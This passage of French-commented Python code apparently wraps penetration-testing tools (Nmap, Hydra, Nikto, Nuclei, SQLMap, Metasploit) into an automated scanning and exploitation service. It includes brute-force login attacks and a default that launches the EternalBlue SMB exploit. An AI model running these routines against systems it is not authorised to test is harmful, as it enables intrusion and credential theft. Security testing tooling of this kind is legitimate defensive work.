        """Parse la sortie d'une recherche d'exploits"""
        exploits = []
        lines = output.split('\n')
        
        for line in lines:
            # Format typique: "   0  exploit/windows/smb/ms17_010_eternalblue  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption"
            exploit_match = re.match(r'\s*\d+\s+(exploit/[^\s]+)\s+(.+)', line)
            if exploit_match:
                exploits.append({
                    'module': exploit_match.group(1),
                    'description': exploit_match.group(2).strip(),
                    'type': 'exploit'
                })
            
            # Format pour auxiliaires
            aux_match = re.match(r'\s*\d+\s+(auxiliary/[^\s]+)\s+(.+)', line)
            if aux_match:
                exploits.append({
                    'module': aux_match.group(1),
                    'description': aux_match.group(2).strip(),
                    'type': 'auxiliary'
                })
        
        return exploits


# ===== CLASSE PRINCIPALE =====
class HuntKitIntegration:
    """Intégration principale pour utiliser HuntKit avec Celery - VERSION COMPLÈTE CORRIGÉE"""
    
    def __init__(self):
        self.tools_manager = HuntKitToolsManager()
        self.nmap = NmapWrapper(self.tools_manager)
        self.hydra = HydraWrapper(self.tools_manager)
        self.nikto = NiktoWrapper(self.tools_manager)
        self.nuclei = NucleiWrapper(self.tools_manager)
        self.sqlmap = SQLMapWrapper(self.tools_manager)
        self.metasploit = MetasploitWrapper(self.tools_manager)
    
    def get_tool_status(self) -> Dict[str, Any]:
        """Retourne le statut de tous les outils"""
        tools_status = self.tools_manager.verify_tools()
        
        # Test spécial pour Metasploit
        msf_test = self.metasploit.test_metasploit_availability()
        tools_status['metasploit_detailed'] = msf_test
        
        return {
            'tools_available': tools_status,
            'wordlists': self.tools_manager.wordlists,
            'tools_dir': self.tools_manager.tools_dir,
            'initialized_at': datetime.now().isoformat(),
            'metasploit_info': msf_test
        }
    
    def run_discovery(self, target: str) -> Dict[str, Any]:
        """Lance une découverte réseau complète - VERSION CORRIGÉE"""
        logger.info(f"🌐 Début découverte réseau: {target}")
        
        # 1. Ping scan pour découvrir les hôtes
        ping_result = self.nmap.ping_scan(target)
        
        if not ping_result['success']:
            return {
                'success': False,
                'error': f"Échec du ping scan: {ping_result['stderr']}",
                'target': target
            }
        
        # 2. Port scan sur les hôtes découverts
        port_results = []
        discovered_hosts = ping_result.get('parsed', {}).get('hosts_found', [])
        
        for host in discovered_hosts[:10]:  # Limiter à 10 hôtes max
            host_target = host['host']
            
            # ✅ FIX: Extraire seulement l'IP du nom d'hôte complexe
            if '(' in host_target and ')' in host_target:
                # Extraire l'IP entre parenthèses: "nom (192.168.1.1)" -> "192.168.1.1"
                ip_match = re.search(r'\(([0-9.]+)\)', host_target)
                if ip_match:
                    host_target = ip_match.group(1)
            
            logger.info(f"🔍 Scan de ports sur: {host_target}")
            
            docker_ports = '21,22,23,25,53,80,111,135,139,443,445,512,513,514,993,995,1099,1433,1524,1723,2121,3000,3306,3389,4369,5000,5432,5555,5672,5900,5984,6000,6379,6667,8000,8009,8080,8180,8443,8888,9000,9042,9200,9300,11211,27017,27018,27019,28017'
            port_result = self.nmap.port_scan(host_target, docker_ports)
            port_results.append({
                'host': host_target,
                'original_host': host['host'],  # Garder le nom original
                'ports': port_result
            })
        
        return {
            'success': True,
            'target': target,
            'ping_scan': ping_result,
            'port_scans': port_results,
            'summary': {
                'hosts_discovered': len(discovered_hosts),
                'hosts_scanned': len(port_results)
            }
        }
    
    def run_web_audit(self, target: str, port: int = 80, ssl: bool = False) -> Dict[str, Any]:
        """Lance un audit web complet - VERSION CORRIGÉE"""
        logger.info(f"🕷️ Début audit web: {target}:{port} (SSL: {ssl})")
        
        results = {}
        
        # 1. Nikto scan
        logger.info("🕷️ Lancement Nikto...")
        nikto_result = self.nikto.web_scan(target, port, ssl)
        results['nikto'] = nikto_result
        logger.info(f"🕷️ Nikto terminé: {nikto_result.get('parsed', {}).get('total_vulnerabilities', 0)} vulns")
        
        # 2. Nuclei scan
        logger.info("🎯 Lancement Nuclei...")
        protocol = 'https' if ssl else 'http'
        url = f"{protocol}://{target}:{port}"
        nuclei_result = self.nuclei.vulnerability_scan(url)
        results['nuclei'] = nuclei_result
        logger.info(f"🎯 Nuclei terminé: {nuclei_result.get('parsed', {}).get('total_vulnerabilities', 0)} vulns")
        
        # 3. SQLMap scan (sur l'URL de base)
        logger.info("💉 Lancement SQLMap...")
        sqlmap_result = self.sqlmap.sql_injection_scan(url)
        results['sqlmap'] = sqlmap_result
        logger.info(f"💉 SQLMap terminé: injection = {sqlmap_result.get('parsed', {}).get('injection_found', False)}")
        
        # Calculer le résumé
        nikto_vulns = results['nikto'].get('parsed', {}).get('total_vulnerabilities', 0)
        nuclei_vulns = results['nuclei'].get('parsed', {}).get('total_vulnerabilities', 0)
        sql_injection = results['sqlmap'].get('parsed', {}).get('injection_found', False)
        
        return {
            'success': True,
            'target': f"{target}:{port}",
            'ssl': ssl,
            'results': results,
            'summary': {
                'nikto_vulns': nikto_vulns,
                'nuclei_vulns': nuclei_vulns,
                'sql_injection': sql_injection,
                'total_issues': nikto_vulns + nuclei_vulns + (1 if sql_injection else 0)
            }
        }
    
    def run_brute_force(self, target: str, service: str, userlist: str = None, 
                       passwordlist: str = None) -> Dict[str, Any]:
        """Lance une attaque par force brute"""
        logger.info(f"🔨 Début force brute: {target} ({service})")
        
        # Utiliser les wordlists par défaut si non spécifiées
        if not passwordlist:
            passwordlist = self.tools_manager.wordlists.get('common_passwords')
        
        result = self.hydra.brute_force(
            target=target,
            service=service,
            userlist=userlist,
            passwordlist=passwordlist
        )
        
        return {
            'success': result['success'],
            'target': target,
            'service': service,
            'result': result,
            'credentials_found': result.get('parsed', {}).get('credentials_found', [])
        }

    def run_exploitation(self, target: str, port: int = None, service: str = None, 
                        exploit_module: str = None, options: Dict = None) -> Dict[str, Any]:
        """Lance une exploitation avec Metasploit - NOUVELLE FONCTION"""
        logger.info(f"🎯 Début exploitation: {target}")
        
        start_time = time.time()
        
        try:
            # Si aucun module spécifié, essayer de deviner selon le service
            if not exploit_module and service:
                # Utiliser des modules par défaut SEULEMENT si aucun module spécifié
                service_defaults = {
                    'ssh': 'auxiliary/scanner/ssh/ssh_login',
                    'smb': 'exploit/windows/smb/ms17_010_eternalblue',
                    'http': 'auxiliary/scanner/http/title',
                    'ftp': 'auxiliary/scanner/ftp/ftp_login'
                }
                exploit_module = service_defaults.get(service.lower())
                if not exploit_module:
                    exploit_module = f'auxiliary/scanner/{service}/{service}_login'
            
            # Port par défaut selon le service
            if not port and service:
                port_mapping = {
                    'ssh': 22, 'ftp': 21, 'telnet': 23, 'smtp': 25,
                    'http': 80, 'https': 443, 'smb': 445, 'mysql': 3306
                }
                port = port_mapping.get(service.lower(), 80)
            
            # Lancer l'exploitation
            if exploit_module.startswith('auxiliary/'):
                result = self.metasploit.run_auxiliary_scan(
                    target, port or 80, service or 'unknown', options
                )
            else:
                result = self.metasploit.run_exploit_module(
                    target, port or 80, exploit_module, options
                )
            
            duration = int(time.time() - start_time)
            
            return {
                'success': result['success'],
                'target': target,
                'port': port,
                'service': service,
                'exploit_module': exploit_module,
                'duration': duration,
                'result': result,
                'summary': self._create_exploitation_summary(result),
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            duration = int(time.time() - start_time)
            logger.error(f"❌ Erreur exploitation: {e}")
            
            return {
                'success': False,
                'target': target,
                'error': str(e),
                'duration': duration,
                'timestamp': datetime.now().isoformat()
            }


    def _create_exploitation_summary(self, result: Dict) -> str:
        """Crée un résumé lisible des résultats d'exploitation"""
        if not result.get('success'):
            return f"Échec de l'exploitation: {result.get('error', 'Erreur inconnue')}"
        
        parsed = result.get('parsed_result', {})
        
        if parsed.get('sessions_opened', 0) > 0:
            return f"✅ Exploitation réussie ! {parsed['sessions_opened']} session(s) ouverte(s)"
        
        if parsed.get('credentials_found'):
            creds_count = len(parsed['credentials_found'])
            return f"🔑 {creds_count} credential(s) découvert(s)"
        
        if parsed.get('vulnerabilities_found'):
            vuln_count = len(parsed['vulnerabilities_found'])
            return f"⚠️ {vuln_count} vulnérabilité(s) détectée(s)"
        
        if parsed.get('status') == 'not_vulnerable':
            return "✅ Cible non vulnérable à ce module"
        
        return "ℹ️ Exploitation terminée - voir détails"
